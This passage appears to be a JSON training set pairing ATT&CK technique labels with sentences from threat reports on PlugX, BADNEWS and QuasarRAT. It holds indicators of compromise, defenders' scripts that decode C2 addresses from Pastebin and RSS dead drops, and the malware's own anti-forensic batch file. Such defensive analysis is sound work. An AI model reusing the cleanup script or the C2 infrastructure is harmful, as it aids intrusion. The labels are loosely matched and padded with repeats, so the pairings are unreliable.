            "In addition to this, the malware queries four PasteBin links to extract the C2 addresses from these links:  https://pastebin[.]com/eSsjmhBG https://pastebin[.]com/PSxQd6qw https://pastebin[.]com/CzjM9qwi https://pastebin[.]com/xHDSxxMD  A full list of the extracted strings from the configuration is given in Appendix D \u2013 Extracted PlugX Strings"
        ]
    },
    "web service input capture-multi": {
        "technique_names": [
            "web service",
            "input capture"
        ],
        "sentances": [
            "An example of the content retrieved from Pastebin is given below:       ---- BEGIN SSH2 PUBLIC KEY ----Comment: \"rsa-key\"AAAAB3NzaC1yc2EAAAABJQAAAQEAhLxZe4Qli9xt/WknQK9CDLWubpgknZ0HIHSd8uV/TJvLsRkjpV+U/tMiMxjDwLAHVtNcww2h8bXTtw387M2Iv/mJjQ9Lv3BdNiM3/KvmlpeJZrrFu2n5UC9=DZKSDAAADOECEDFDOCCDEDIDOCIDEDOCHDDZJS=oT+Ps8wD4f0NBUtDdEdXhWp3nxv/mJjQ9Lv3BCFDBd09UZzLrfBO1S0nxrHsxlJ+bPaJE2Q/oxLXTrpeJ6AHyLyeUaBha3q9niJ=---- END SSH2 PUBLIC KEY ----     At first glanced we missed it, but the paste uses the same technique discussed in this Airbus post"
        ]
    },
    "system service discovery standard application layer protocol account discovery exploitation for client execution-multi": {
        "technique_names": [
            "system service discovery",
            "standard application layer protocol",
            "account discovery",
            "exploitation for client execution"
        ],
        "sentances": [
            "Appendix A \u2013 Related IoCs Directly related: 45.248.84[.]7 172.104.65[.]97    SHA256 Comments   5909c1dcfb3270b2b057513561b2ab1613687a0af0072c51244ff005b113888b PlugX   6804be0689bbfbb180bb384ebc316f50cb87e65553d0c3597d6e9b6b6dd8dd3f PlugX   8ea275eee557037ab6626d15c0107bdcf20b45a8307a0dc3baa85d49acc94331 PlugX   e6020eb997715c4f627b6e6a16947861bce310aa31fcf58448a5beba11626d36 PlugX   4554aa6c2fdd58dfddebdb786c5d23cd6277025ab0355ffb5d8967c3976e8659 PlugX   3817388a983d5ee1604a8eec621b5eb251cb8bdeab9c8591fe5e8c90cd99ed49 CVE-2017-0199   45513f942b217def56a1eac82a4b5edca65ebdd5e36c7a8751bf0350d5ebea39 CVE-2017-0199   64d7d4846c5dd00a7271fe8a83aebe4317d06abad84d44ffd6f42b1004704bd5 PlugX   07d94726a1ae764fa5322531f29fe80f0246dd40b4d052c98f269987a3ee4515 PowerShell PlugX   4622f8357846f7a0bea3ce453bb068b443e21359203dfa2f74301c7a79a408c2 Downloader for PS PlugX ++ MSI PlugX   49baf12f50fec772fdfe56c49005efb306b72a312a7dbdad98066029a191bfaf CVE-2017-0199    https://pastebin[.]com/eSsjmhBG https://pastebin[.]com/PSxQd6qw https://pastebin[.]com/CzjM9qwi https://pastebin[.]com/xHDSxxMD Inferred relation via similar targeting    SHA256 Family   6e5864faf4312bf3787e79e432c1acacf2a699ecb5b797cac56e62ed0a8e965c Idicaf   6b455714664a65e2a4af61b11d141467f4554e215e3ebd02e8f3876d8aa31954 Idicaf   df58962a3a065f1587f543a501d0e3f0ca05ebac51fc35d4bb4669d8eac9d8c1 Idicaf   52fee36c647ca799e21cd75db1f425ccf632b28c27e67b8578ff6dd30ca62af7 Idicaf   90e45c7b3798433199d6d917a4847a409dbdc101b210d9798f8c78ee43abf6d8 Idicaf   5ff788efd079eb2987b03d98e0c8211ac97ae6479274bade36a170b5a396f72b Idicaf   535abe8cd436d6b635c5687db0ae8d47c7c3679e4f5e2b4d629276b41fca0578 Idicaf   ef85896426a0a558ab17346a67f108045d142a2d2a21f7702bfb8be50542726d Idicaf   d41e2bbc8ea10dd7543d5f4cb02983e2b1ad5d47cc3ce5fa95189501c019fdac Idicaf   208bd18054134909e2ad680c0096477c48a58e8754a9439002e6523f71e66d47 PlugX   3e9136f95fa55852993cd15b82fe6ec54f78f34584f7689b512a46f0a22907f2 PlugX   5deab61f83e9afe13a79930eda1bdcb6c867042a1ce0e5c44e4209a60ab3327d PlugX   6500636c29eba70efd3eb3be1d094dfda4ec6cca52ace23d50e98e6b63308fdb PlugX   8e07c7636be935e0a6184db8a85fd8b607e6c48bb07d34d0138432f7c697bc99 PlugX    Domains: kbklxpb.imshop.in serupdate.wicp.net msfcnsoft.com micros0ff.com msfcnsoft.com microsoff.net msffncsi.com A781195.gicp.net upgradsource.com B781195.vicp.net kbklxp.eicp.net Appendix B \u2013 Python Scripts LZNT1 decrypt script, only works with Windows"
        ]
    },
    "process hollowing security software discovery application window discovery file deletion modify registry exploitation for client execution service execution-multi": {
        "technique_names": [
            "process hollowing",
            "security software discovery",
            "application window discovery",
            "file deletion",
            "modify registry",
            "exploitation for client execution",
            "service execution"
        ],
        "sentances": [
            "key1 += 3373 \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0key2 -= 39779 \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0dec = ord(c) ^ (((key2 >> 16) & 0xff ^ ((key2 & 0xff ^ (((key1 >> 16) & 0xff ^ (key1 - (key1 >> 8) & 0xff)) - (key1 >> 24) & 0xff)) - (key2 >> 8) & 0xff)) - (key2 >> 24) & 0xff)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0out = out + chr(dec)\u00a0\u00a0\u00a0\u00a0return out     Decoding the C2 addresses from Pastebin:      1234567891011121314151617181920212223242526272829303132333435363738  import structdef decode(buf):\u00a0\u00a0\u00a0\u00a0res = \"\"\u00a0\u00a0\u00a0\u00a0for i in range(0, len(buf) -1, 2):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0dl = ord(buf[i + 1])\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0dl = dl - 0x41\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0dl = dl * 0x10\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0dl = dl + ord(buf[i])\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0dl = dl - 0x41\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0res += chr(dl)\u00a0\u00a0\u00a0\u00a0return resdef decode_plugx_pastebin(buf):\u00a0\u00a0\u00a0\u00a0start = buf.find('DZKS')\u00a0\u00a0\u00a0\u00a0if start == -1:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return None\u00a0\u00a0\u00a0\u00a0end = buf.find('DZJS', start + 4)\u00a0\u00a0\u00a0\u00a0if end == -1:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return None\u00a0\u00a0\u00a0\u00a0start += 4\u00a0\u00a0\u00a0\u00a0data = buf[start:end]\u00a0\u00a0\u00a0\u00a0decoded = decode(data)\u00a0\u00a0\u00a0\u00a0connection_type = struct.unpack_from('&lt;H', decoded, 0)[0]\u00a0\u00a0\u00a0\u00a0port = struct.unpack_from('&lt;H', decoded, 2)[0]\u00a0\u00a0\u00a0\u00a0ip = decoded[4:]\u00a0\u00a0\u00a0\u00a0print \"Decoded IP: {}:{}, type: {}\".format(ip, port, connection_type)\u00a0\u00a0\u00a0\u00a0return Truedecode_plugx_pastebin('AAAAB3NzaC1yc2EAAAABJQAAAQEAhLxZe4Qli9xt/WknQK9CDLWubpgknZ0HIHSd8uV/TJvLsRkjpV+U/tMiMxjDwLAHVtNcww2h8bXTtw387M2Iv/mJjQ9Lv3BdNiM3/KvmlZrrn5UC9=DZKSGAAALLBAEDFDOCCDEDIDOCIDEDOCHDDZJS=oT+PsFu2q9n8wD4f0NBUtDdEdXhWp3nxv/mJjQ9Lv3BCFDBd09UZzLrfBO1S0nxrHsxlJ+bPaJE2Q/oxLXTrpeJ6AHyLyeUaBha3J=')decode_plugx_pastebin('AAAAB3NzaC1yc2EAAAABJQAAAQEAhLxZe4Qli9xt/WknQK9CDLWubpgknZ0HIHSd8uV/TJvLsRkjpV+U/tMiMxjDwLAHVtNcww2h8bXTtw387M2Iv/mJjQ9Lv3BdNiM3/KvmlZrrn5UC9=DZKSDAAAAFAAEDFDOCCDEDIDOCIDEDOCHDDZJS=oT+PsAHyLye8wD4f0NBUtDdEdXhWp3nxv/mJjQ9Lv3BCFDBd09UZzLrfBO1S0nxrHsxlJ+bPaJE2Q/oxLXTrpeJ6aBha3q9niJFu2=')decode_plugx_pastebin('AAAAB3NzaC1yc2EAAAABJQAAAQEAhLxZe4Qli9xt/WknQK9CDLWubpgknZ0HIHSd8uV/TJvLsRkjpV+U/tMiMxjDwLAHVtNcww2h8bXTtw387M2Iv/mJjQ9Lv3BdNiM3/KvmlZrrn5UC9=DZKSEAAABGHBEDFDOCCDEDIDOCIDEDOCHDDZJS=oT+PsFu2niJ8wD4f0NBUtDdEdXhWp3nxv/mJjQ9Lv3BCFDBd09UZzLrfBO1S0nxrHsxlJ+bPaJE2Q/oxLXTrpeJ6AHyLyeUaBha3q9=')decode_plugx_pastebin('AAAAB3NzaC1yc2EAAAABJQAAAQEAhLxZe4Qli9xt/WknQK9CDLWubpgknZ0HIHSd8uV/TJvLsRkjpV+U/tMiMxjDwLAHVtNcww2h8bXTtw387M2Iv/mJjQ9Lv3BdNiM3/KvmlpeJZrrFu2n5UC9=DZKSDAAADOECEDFDOCCDEDIDOCIDEDOCHDDZJS=oT+Ps8wD4f0NBUtDdEdXhWp3nxv/mJjQ9Lv3BCFDBd09UZzLrfBO1S0nxrHsxlJ+bPaJE2Q/oxLXTrpeJ6AHyLyeUaBha3q9niJ=')     Appendix C \u2013 a.bat      12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697  mscorsvw.execscript del.vbsdel BlackBox.dlldel mscorsvw.exedel BlackBoxdel explorer.execscript del.vbsdel %sfxcmd%del mscorsvw.exedel BlackBox.dlldel BlackBoxdel explorer.exedel del.vbsdel a.batdel %sfxcmd%del mscorsvw.exedel BlackBox.dlldel BlackBoxdel explorer.exedel del.vbsdel a.batreg delete \"HKLM\\SYSTEM\\ControlSet001\\services\\emproxy\" /freg delete \"HKLM\\SYSTEM\\ControlSet002\\services\\emproxy\" /freg delete \"HKLM\\SYSTEM\\CurrentControlSet\\services\\emproxy\" /freg delete \"HKLM\\SYSTEM\\ControlSet001\\services\\EmpPrx\" /freg delete \"HKLM\\SYSTEM\\ControlSet002\\services\\EmpPrx\" /freg delete \"HKLM\\SYSTEM\\CurrentControlSet\\services\\EmpPrx\" /freg delete \"HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Tracing\\svchost_RASAPI32\" /freg delete \"HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Tracing\\svchost_RASMANCS\" /freg delete \"HKU\\.DEFAULT\\Software\\WinRAR SFX\" /freg delete \"HKU\\S-1-5-18\\Software\\WinRAR SFX\" /freg delete \"HKU\\S-1-5-18\\Software\\Microsoft\\Windows Script Host\" /freg delete \"HKU\\S-1-5-18\\Software\\Microsoft\\Windows Script Host\\Settings\" /freg delete \"HKU\\S-1-5-18\\Software\\WinRAR SFX\" /freg delete \"HKU\\S-1-5-18\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\Count\\P:\\Hfref\\Nqzvavfgengbe\\Qbjaybnqf\\fipubfg\\fipubfg.rkr\" /freg delete \"HKU\\S-1-5-18\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\Count\\{Q65231O0-O2S1-4857-N4PR-N8R7P6RN7Q27}\\pzq.rkr\" /freg delete \"HKU\\S-1-5-18\\Software\\WinRAR SFX\\C%%Users%ADMINI~1%AppData%Local%Temp\" /freg delete \"HKU\\S-1-5-18\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\Count\\HRZR_PGYFRFFVBA\" /freg delete \"HKU\\S-1-5-18\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\Count\\{S38OS404-1Q43-42S2-9305-67QR0O28SP23}\\rkcybere.rkr\" /freg delete \"HKU\\S-1-5-18\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\Count\\P:\\Hfref\\Nqzvavfgengbe\\Qbjaybnqf\\ErtfubgCbegnoyr\\Ncc\\ertfubg\\ertfubg_k64.rkr\" /freg delete \"HKU\\S-1-5-18\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections\\SavedLegacySettings\" /freg delete \"HKU\\S-1-5-19\\Software\\WinRAR SFX\" /freg delete \"HKU\\S-1-5-19\\Software\\Microsoft\\Windows Script Host\" /freg delete \"HKU\\S-1-5-19\\Software\\Microsoft\\Windows Script Host\\Settings\" /freg delete \"HKU\\S-1-5-19\\Software\\WinRAR SFX\" /freg delete \"HKU\\S-1-5-19\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\Count\\P:\\Hfref\\Nqzvavfgengbe\\Qbjaybnqf\\fipubfg\\fipubfg.rkr\" /freg delete \"HKU\\S-1-5-19\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\Count\\{Q65231O0-O2S1-4857-N4PR-N8R7P6RN7Q27}\\pzq.rkr\" /freg delete \"HKU\\S-1-5-19\\Software\\WinRAR SFX\\C%%Users%ADMINI~1%AppData%Local%Temp\" /freg delete \"HKU\\S-1-5-19\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\Count\\HRZR_PGYFRFFVBA\" /freg delete \"HKU\\S-1-5-19\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\Count\\{S38OS404-1Q43-42S2-9305-67QR0O28SP23}\\rkcybere.rkr\" /freg delete \"HKU\\S-1-5-19\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\Count\\P:\\Hfref\\Nqzvavfgengbe\\Qbjaybnqf\\ErtfubgCbegnoyr\\Ncc\\ertfubg\\ertfubg_k64.rkr\" /freg delete \"HKU\\S-1-5-19\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections\\SavedLegacySettings\" /freg delete \"HKU\\S-1-5-20\\Software\\WinRAR SFX\" /freg delete \"HKU\\S-1-5-20\\Software\\Microsoft\\Windows Script Host\" /freg delete \"HKU\\S-1-5-20\\Software\\Microsoft\\Windows Script Host\\Settings\" /freg delete \"HKU\\S-1-5-20\\Software\\WinRAR SFX\" /freg delete \"HKU\\S-1-5-20\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\Count\\P:\\Hfref\\Nqzvavfgengbe\\Qbjaybnqf\\fipubfg\\fipubfg.rkr\" /freg delete \"HKU\\S-1-5-20\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\Count\\{Q65231O0-O2S1-4857-N4PR-N8R7P6RN7Q27}\\pzq.rkr\" /freg delete \"HKU\\S-1-5-20\\Software\\WinRAR SFX\\C%%Users%ADMINI~1%AppData%Local%Temp\" /freg delete \"HKU\\S-1-5-20\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\Count\\HRZR_PGYFRFFVBA\" /freg delete \"HKU\\S-1-5-20\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\Count\\{S38OS404-1Q43-42S2-9305-67QR0O28SP23}\\rkcybere.rkr\" /freg delete \"HKU\\S-1-5-20\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\Count\\P:\\Hfref\\Nqzvavfgengbe\\Qbjaybnqf\\ErtfubgCbegnoyr\\Ncc\\ertfubg\\ertfubg_k64.rkr\" /freg delete \"HKU\\S-1-5-20\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections\\SavedLegacySettings\" /freg delete \"HKU\\S-1-5-21-590835768-3595378272-1660587800-1643\\Software\\WinRAR SFX\" /freg delete \"HKU\\S-1-5-21-590835768-3595378272-1660587800-1643\\Software\\Microsoft\\Windows Script Host\" /freg delete \"HKU\\S-1-5-21-590835768-3595378272-1660587800-1643\\Software\\Microsoft\\Windows Script Host\\Settings\" /freg delete \"HKU\\S-1-5-21-590835768-3595378272-1660587800-1643\\Software\\WinRAR SFX\" /freg delete \"HKU\\S-1-5-21-590835768-3595378272-1660587800-1643\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\Count\\P:\\Hfref\\Nqzvavfgengbe\\Qbjaybnqf\\fipubfg\\fipubfg.rkr\" /freg delete \"HKU\\S-1-5-21-590835768-3595378272-1660587800-1643\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\Count\\{Q65231O0-O2S1-4857-N4PR-N8R7P6RN7Q27}\\pzq.rkr\" /freg delete \"HKU\\S-1-5-21-590835768-3595378272-1660587800-1643\\Software\\WinRAR SFX\\C%%Users%ADMINI~1%AppData%Local%Temp\" /freg delete \"HKU\\S-1-5-21-590835768-3595378272-1660587800-1643\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\Count\\HRZR_PGYFRFFVBA\" /freg delete \"HKU\\S-1-5-21-590835768-3595378272-1660587800-1643\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\Count\\{S38OS404-1Q43-42S2-9305-67QR0O28SP23}\\rkcybere.rkr\" /freg delete \"HKU\\S-1-5-21-590835768-3595378272-1660587800-1643\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\Count\\P:\\Hfref\\Nqzvavfgengbe\\Qbjaybnqf\\ErtfubgCbegnoyr\\Ncc\\ertfubg\\ertfubg_k64.rkr\" /freg delete \"HKU\\S-1-5-21-590835768-3595378272-1660587800-1643\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections\\SavedLegacySettings\" /freg delete \"HKU\\S-1-5-21-590835768-3595378272-1660587800-1643_Classes\\Software\\WinRAR SFX\" /freg delete \"HKU\\S-1-5-21-590835768-3595378272-1660587800-1643_Classes\\Software\\Microsoft\\Windows Script Host\" /freg delete \"HKU\\S-1-5-21-590835768-3595378272-1660587800-1643_Classes\\Software\\Microsoft\\Windows Script Host\\Settings\" /freg delete \"HKU\\S-1-5-21-590835768-3595378272-1660587800-1643_Classes\\Software\\WinRAR SFX\" /freg delete \"HKU\\S-1-5-21-590835768-3595378272-1660587800-1643_Classes\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\Count\\P:\\Hfref\\Nqzvavfgengbe\\Qbjaybnqf\\fipubfg\\fipubfg.rkr\" /freg delete \"HKU\\S-1-5-21-590835768-3595378272-1660587800-1643_Classes\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\Count\\{Q65231O0-O2S1-4857-N4PR-N8R7P6RN7Q27}\\pzq.rkr\" /freg delete \"HKU\\S-1-5-21-590835768-3595378272-1660587800-1643_Classes\\Software\\WinRAR SFX\\C%%Users%ADMINI~1%AppData%Local%Temp\" /freg delete \"HKU\\S-1-5-21-590835768-3595378272-1660587800-1643_Classes\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\Count\\HRZR_PGYFRFFVBA\" /freg delete \"HKU\\S-1-5-21-590835768-3595378272-1660587800-1643_Classes\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\Count\\{S38OS404-1Q43-42S2-9305-67QR0O28SP23}\\rkcybere.rkr\" /freg delete \"HKU\\S-1-5-21-590835768-3595378272-1660587800-1643_Classes\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\Count\\P:\\Hfref\\Nqzvavfgengbe\\Qbjaybnqf\\ErtfubgCbegnoyr\\Ncc\\ertfubg\\ertfubg_k64.rkr\" /freg delete \"HKU\\S-1-5-21-590835768-3595378272-1660587800-1643_Classes\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections\\SavedLegacySettings\" /fdel /s c:\\windows\\temp\\*.batdel /s c:\\windows\\temp\\*.datdel /s c:\\windows\\temp\\*.dlldel /s c:\\windows\\temp\\*.exedel /s c:\\windows\\temp\\*.vbsdel %0     Appendix D \u2013 PlugX Extracted strings      123456789101112131415161718  https//pastebin.com/eSsjmhBGhttps://pastebin.com/PSxQd6qwhttps://pastebin.com/CzjM9qwihttps://pastebin.com/xHDSxxMD%ProgramData%\\arm2sv1kDSSMDSSMMicrosoft Office Document Update UtilitySoftware\\Microsoft\\Windows\\CurrentVersion\\RunJmLI%ProgramFiles(x86)%\\Sophos\\AutoUpdate\\ALUpdate.exe%ProgramFiles(x86)%\\Common Files\\Java\\Java Update\\jusched.exe%ProgramFiles(x86)%\\Common Files\\Adobe\\ARM\\1.0\\armsvc.exe%windir%\\system32\\FlashPlayerApp.exeslaxpastebinmahTszuBzqwUTcGt%ProgramData%\\arm2sv1k\\Akgcl"
        ]
    },
    "masquerading file and directory discovery-multi": {
        "technique_names": [
            "masquerading",
            "file and directory discovery",
            "tor"
        ],
        "sentances": [
            "File Indicators Samples Observed from Spear Phishing Messages Above    Filename Chinas_Arctic_Dream.doc   File Size 6587812 bytes   MD5 598eeb6a18233023f3551097aa49b083   SHA1 e9a46966f93fe15c22636a5033c61c725add8fa5   Notes Malicious RTF document that exploits CVE-2017-8570 and drops QuasarRAT file qrat.exe",
            "Additional Observed Malware Files    Filename  Armed-Forces-Officers.doc    File Size  3226435 bytes    MD5  89beb207e7095d237c4d25c4c6e17e97    SHA1  15010f7cea913f2a36c56da7d73c2b9eb5a3878f    Notes Malicious RTF document that exploits CVE-2017-8570 and drops a Delphi RAT with the file name vsrss.exe"
        ]
    },
    "masquerading masquerading-multi": {
        "technique_names": [
            "masquerading"
        ],
        "sentances": [
            "Filename The_Four_Traps_for_China.doc   File Size 4428595 bytes   MD5 7659c41a30976d523bb0fbb8cde49094   SHA1 3f1f3e838a307aff52fbcb5bba5e4c8fe68c30e5   Notes Malicious RTF document that exploits CVE-2017-8570 and drops QuasarRAT file qrat.exe"
        ]
    },
    "user execution data compressed-multi": {
        "technique_names": [
            "user execution",
            "data compressed"
        ],
        "sentances": [
            "The lures are primarily documents of interest to Pakistani nuclear organizations and the Pakistani military as can be seen in the images below:  Figure 1 Lure extracted from a67220bcf289af6a99a9760c05d197d09502c2119f62762f78523aa7cbc96ef1  Figure 2 Lure extracted from 07d5509988b1aa6f8d5203bc4b75e6d7be6acf5055831cc961a51d3e921f96bd  Figure 3 Lure extracted from b8abf94017b159f8c1f0746dca24b4eeaf7e27d2ffa83ca053a87deb7560a571  Figure 4 Lure extracted from d486ed118a425d902044fb7a84267e92b49169c24051ee9de41327ee5e6ac7c2 and fd8394b2ff9cd00380dc2b5a870e15183f1dc3bd82ca6ee58f055b44074c7fd4 \u00a0 The payload from each of the malicious documents is an updated version of the BADNEWS malware family"
        ]
    },
    "screen capture remote file copy-multi": {
        "technique_names": [
            "screen capture",
            "remote file copy"
        ],
        "sentances": [
            "A number of commands are provided to the attackers, including the ability to download and execute additional information, upload documents of interest, and take screenshots of the desktop"
        ]
    },
    "masquerading exfiltration over command and control channel-multi": {
        "technique_names": [
            "masquerading",
            "exfiltration over command and control channel"
        ],
        "sentances": [
            "All of these files reside in the victim\u2019s %TEMP% directory:    Filename Description   9PT568.dat Contains victim unique identifier   TPX498.dat Keystroke logs   edg499.dat List of interesting files   TPX499.dat Temporarily holds screenshot when given command by C2   up Temporarily contains downloaded file to be executed when given command by C2    \u00a0 Other changes we noticed in this variant include how the malware obfuscates C2 information stored via dead drop resolvers"
        ]
    },
    "exfiltration over alternative protocol data encoding data encrypted-multi": {
        "technique_names": [
            "exfiltration over alternative protocol",
            "data encoding",
            "data encrypted"
        ],
        "sentances": [
            "Indicators of Compromise Malicious Word Document SHA256 Hashes a67220bcf289af6a99a9760c05d197d09502c2119f62762f78523aa7cbc96ef1 07d5509988b1aa6f8d5203bc4b75e6d7be6acf5055831cc961a51d3e921f96bd fd8394b2ff9cd00380dc2b5a870e15183f1dc3bd82ca6ee58f055b44074c7fd4 b8abf94017b159f8c1f0746dca24b4eeaf7e27d2ffa83ca053a87deb7560a571 d486ed118a425d902044fb7a84267e92b49169c24051ee9de41327ee5e6ac7c2 \u00a0 BADNEWS SHA256 Hashes ab4f86a3144642346a3a40e500ace71badc06a962758522ca13801b40e9e7f4a 290ac98de80154705794e96d0c6d657c948b7dff7abf25ea817585e4c923adb2 \u00a0 C2 Servers 185.203.118[.]115 94.156.35[.]204 \u00a0 Dead Drop Resolvers hxxp://feed43[.]com/8166706728852850.xml hxxp://feed43[.]com/3210021137734622.xml hxxp://www.webrss[.]com/createfeed.php?feedid=49966 hxxp://feeds.rapidfeeds[.]com/88604/ \u00a0 Script to Decrypt Dead Drop Resolversimport requests import base64 import binascii import re from Crypto.Cipher import Blowfish from struct import pack   rol = lambda val, r_bits, max_bits: (val << r_bits%max_bits) & (2**max_bits-1) | ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))  ror = lambda val, r_bits, max_bits: ((val & (2**max_bits-1)) >> r_bits%max_bits) | (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))   def unhexData(d):   if len(d) % 2:     d = d.zfill(len(d)+1)   return ord(binascii.unhexlify(d))   def decodeDecrypt(data):   decdata = ''   for x in range(len(data)):     x = x*2     if x < len(data):       c = unhexData(data[x])       add_num = unhexData(data[x+1])       c = c << 4       c = (c + add_num) & 0xff       c ^= 0x23       c = rol(c, 3, 8)       decdata += chr(c)   data2 = base64.b64decode(decdata)   key = binascii.unhexlify(\"F0E1D2C3B4A5968778695A4B3C2D1E0F0011223344556677\")   cipher = Blowfish.new(key, Blowfish.MODE_ECB)   dec = cipher.decrypt(data2)   return dec   urls = [   \"http://feeds.rapidfeeds.com/88604\" ]  for d in urls:   r = requests.get(d)   body = r.text   r = re.search(\"\\[+\\s*([a-zA-Z0-9\\=]+)\\]+\", body)   if r:     data = base64.b64decode(r.group(0))     print(\"[{}] Decrypted C2: {}\".format(d, decodeDecrypt(data).split(\"\\x00\")[0]))\u00a0 The post Patchwork Continues to Deliver BADNEWS to the Indian Subcontinent appeared first on Palo Alto Networks Blog"
        ]
    },
    "standard application layer protocol web service uncommonly used port-multi": {
        "technique_names": [
            "standard application layer protocol",
            "web service",
            "uncommonly used port",
            "commonly used port"
        ],
        "sentances": [
            "Is the command and control server used by the Poseidon Group still active? Have you been able to sinkhole any of the command and controls? Poseidon Group has interesting practices when it comes to its use of command and control servers, including redundancies and quickly discarding command and control (C&Cs) servers after specific campaigns"
        ]
    },
    "audio capture": [
        "Microphone, Voice IP applications",
        "High resolution screenshots of specified process windows and when recording VoiceIP application audio",
        "capturing audio ",
        "capturing audio ",
        "capturing audio ",
        "capturing audio ",
        "capturing audio ",
        "capturing audio ",
        "capturing audio ",
        "capturing audio ",
        "capturing audio ",
        "capturing audio ",
        "capturing audio ",
        "capturing audio ",
        "capturing audio ",
        "capturing audio ",
        "capturing audio ",
        "capturing audio ",
        "capturing audio ",
        "capturing audio ",
        "capturing audio ",
        "capturing audio ",
        "capturing audio ",
        "capturing audio ",
        "capturing audio ",
        "capturing audio ",
        "capturing audio ",
        "capturing audio ",
        "capturing audio ",
        "capturing audio ",
        "capturing audio ",
        "capturing audio ",
        "capturing audio ",
        "capturing audio ",
        "capturing audio ",
        "capturing audio ",
        "capturing audio ",
        "capturing audio ",
        "capturing audio ",
        "capturing audio ",
        "capturing audio ",
        "capturing audio ",
        "capturing audio ",
        "capturing audio ",
        "capturing audio ",
        "capturing audio ",
        "capturing audio ",
        "capturing audio ",
        "capturing audio ",
        "capturing audio ",
        "capturing audio ",
        "capturing audio ",
        " capture microphone ",
        " capture microphone ",
        " capture microphone ",
        " capture microphone ",
        " capture microphone ",
        " capture microphone ",
        " capture microphone ",
        " capture microphone ",
        " capture microphone ",
        " capture microphone ",
        " capture microphone ",
        " capture microphone ",
        " capture microphone ",
        " capture microphone ",
        " capture microphone ",
        " capture microphone ",
        " capture microphone ",
        " capture microphone ",
        " capture microphone ",
        " capture microphone ",
        " capture microphone ",
        " capture microphone ",
        " capture microphone ",
        " capture microphone ",
        " capture microphone ",
        " capture microphone ",
